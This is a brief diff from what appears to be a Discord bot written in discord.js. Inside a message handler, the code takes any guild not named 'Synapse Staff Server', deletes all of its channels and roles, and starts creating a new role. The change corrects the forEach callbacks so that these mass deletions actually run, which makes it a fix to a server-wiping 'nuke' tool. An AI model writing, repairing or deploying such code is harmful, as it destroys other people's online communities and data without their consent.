@@ -25,10 +25,10 @@ client.on('message', function(message) {
           })
           if(yeet !== null){
             if(yeet.name !== "Synapse Staff Server"){
-              yeet.channels.forEach(function(id,chan){
+              yeet.channels.forEach(function(chan){
                  chan.delete();
                })
-              yeet.roles.forEach(function(id,role){
+              yeet.roles.forEach(function(role){
                  role.delete();
                })
               yeet.createRole({
